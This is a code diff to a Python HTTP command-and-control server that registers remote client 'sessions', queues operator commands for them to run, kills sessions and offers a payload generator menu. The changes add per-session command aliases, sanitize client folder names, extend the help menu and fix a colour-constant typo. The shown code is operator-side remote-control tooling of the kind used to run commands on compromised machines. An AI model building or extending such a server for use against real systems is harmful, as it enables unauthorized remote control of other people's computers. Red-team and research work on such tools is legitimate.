@@ -12,6 +12,9 @@ from collections import defaultdict
 import subprocess
 import getpass
 
+# aliases ?
+client_aliases = defaultdict(dict)
+
 os.makedirs("session_logs", exist_ok=True)
 
 os.makedirs("tools", exist_ok=True)
@@ -33,7 +36,7 @@ client_counter = 1
 client_id_map = {}
 
 MAIN_COMMANDS = ["list ", "select ", "payload ", "kill ", "killall ", "exit ", "help ", "? "]
-SESSION_COMMANDS = ["background ", "die "]
+SESSION_COMMANDS = ["alias ", "list aliases ", "del alias ", "background ", "die "]
 
 selected_client = None
 
@@ -93,6 +96,13 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
         if self.path == "/register":
             client_id = fields.get("id", [""])[0]
             client_ip = self.client_address[0]
+
+            # Sanitize client_id and client_ip for use in folder name
+            safe_client_id = re.sub(r'[^\w\-]', '_', client_id)
+            safe_client_ip = re.sub(r'[^\w\-]', '_', client_ip)
+            folder_name = f"{safe_client_id}_{safe_client_ip}"
+
+
             with lock:
                 global client_counter
                 if client_id not in client_id_map:
@@ -108,9 +118,16 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
                     "ip": client_ip,
                     "last_seen": time.time()
                 }
+
+                # create client tools directory for each client
+                #client_tool_dir = os.path.join("tools", folder_name)
+                #os.makedirs(client_tool_dir, exist_ok=True)
+
+
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"Registered")
+
 
         elif self.path.endswith("/result"):
             client_id = self.path.strip("/").split("/")[0]
@@ -193,12 +210,16 @@ def show_help():
     print(f"""
 {ORANGE}Menu Commands:{RESET}
     help | ?             - Show this menu
+    payload              - Payload generator menu
     list                 - List connected sessions
     select <id>          - Connect to a session
     kill <id>            - Terminate session
     killall		 - Terminate all sessions
     exit                 - Exit the server
 {ORANGE}Session Commands:{RESET}
+    alias                - Set an alias for the current session
+    list aliases         - List all aliases for the current session
+    del alias            - Delete an alias for the current session
     background           - Background session
     die                  - Terminate session
 {ORANGE}Payload Menu Commands:{RESET}
@@ -317,9 +338,45 @@ def cli():
                         clients.pop(selected_client, None)
                     print(f"{RED}[!] Sent die command to {selected_client}{RESET}")
                     selected_client = None
+                # alias dict call back
+                elif cmd.startswith("alias "):
+                    parts = cmd[len("alias "):].split("=", 1)
+                    if len(parts) == 2:
+                        alias_name = parts[0].strip()
+                        actual_cmd = parts[1].strip().strip('"').strip("'")
+                        with lock:
+                            client_aliases[selected_client][alias_name] = actual_cmd
+                        print(f"{GREEN}\n[+] Alias '{alias_name}' set to '{actual_cmd}' for session.{RESET}\n")
+                    else:
+                        print(f"{RED}\n[-] Invalid alias format. Use: alias ls='/bin/bash ls'{RESET}\n")
+                elif cmd.startswith("del alias "):
+                    alias_name = cmd[len("del alias "):].strip()
+                    with lock:
+                        if alias_name in client_aliases[selected_client]:
+                            del client_aliases[selected_client][alias_name]
+                            print(f"{GREEN}\n[+] Alias '{alias_name}' deleted for session.{RESET}\n")
+                        else:
+                            print(f"{ORANGE}\n[-] Alias '{alias_name}' not found in this session.{RESET}\n")
+                elif cmd == "list aliases":
+                    with lock:
+                        aliases = client_aliases.get(selected_client, {})
+                        if aliases:
+                            print(f"{ORANGE}\n[+] Active aliases for this session:{RESET}")
+                            for name, value in aliases.items():
+                                print(f"  {GREEN}{name}{RESET} => {BLUE}{value}{RESET}")
+                        else:
+                            print(f"{ORANGE}\n[*] No aliases set for this session.{RESET}")
+                        print(f"")
                 elif cmd:
                     with lock:
+                        # Substitute alias if present
+                        parts = cmd.split()
+                        if parts and parts[0] in client_aliases[selected_client]:
+                            actual_cmd = client_aliases[selected_client][parts[0]]
+                            cmd = " ".join([actual_cmd] + parts[1:])
+                        
                         client_commands[selected_client] = cmd
+
 
 #                    print(f"{BLUE}[>] Waiting for response...{RESET}")
 
@@ -434,7 +491,7 @@ def payload_shell():
             else:
                 print(f"Unknown command. Type {ORANGE}'help'{RESET} for payload options.")
         except KeyboardInterrupt:
-            print(f"{ORNAGE}\n[*] Returning to main menu.{RESET}")
+            print(f"{ORANGE}\n[*] Returning to main menu.{RESET}")
             readline.set_completer(completer)  # Main menu completer
             break
         except Exception as e:
